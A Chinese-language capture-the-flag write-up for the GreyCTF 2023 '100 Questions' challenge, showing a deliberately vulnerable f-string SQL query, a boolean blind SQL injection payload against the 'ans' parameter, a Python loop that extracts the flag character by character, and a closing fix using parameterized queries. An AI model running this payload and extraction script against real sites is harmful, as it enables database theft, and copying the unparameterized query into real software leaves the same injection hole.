# GreyCTF 2023 100 Questions

## 题目简述

页面按 `qn_id` 展示 100 道问答题，并把用户提交的 `ans` 与数据库答案比较。`qn_id` 被限制为 1 到 100 的十进制数字，但 `ans` 直接拼进 SQL 字符串。第 42 条记录的答案保存着 flag，因此可以通过布尔盲注逐字符读取。

## 解题过程

服务端执行的校验语句为：

```python
db.execute(
    f"SELECT * FROM QNA WHERE ID = {qn_id} AND Answer = '{ans}'"
)
```

`ans` 没有参数化。选择任意已知题号，例如 `qn_id=1`，在答案中闭合引号并追加条件：

```sql
2' AND SUBSTRING((SELECT Answer FROM QNA WHERE ID=42), 1, 1) = 'g
```

若猜测正确，查询至少返回一行，页面显示 `Correct`；否则显示错误。依次枚举 `0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_{}`，并把 `SUBSTRING` 的位置从 1 递增，直到读到 `}`：

```python
alphabet = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_{}"
flag = ""

while not flag.endswith("}"):
    pos = len(flag) + 1
    for ch in alphabet:
        ans = f"2' AND SUBSTRING((SELECT Answer FROM QNA WHERE ID=42), {pos}, 1) = '{ch}"
        text = session.get(base_url, params={"qn_id": 1, "ans": ans}).text
        if "Correct" in text:
            flag += ch
            break
```

这里使用 `=` 保留大小写差异；若改用 SQLite 默认的 `LIKE`，ASCII 字符通常不区分大小写。最终恢复：

```text
grey{1_c4N7_533}
```

## 方法总结

只校验一个参数并不能保护同一条 SQL 中的另一个参数。确认布尔回显后，应选稳定的真假条件、明确目标行，并使用区分大小写的比较逐字符提取。根本修复是对所有用户输入使用参数化查询，而不是继续扩充字符过滤规则。
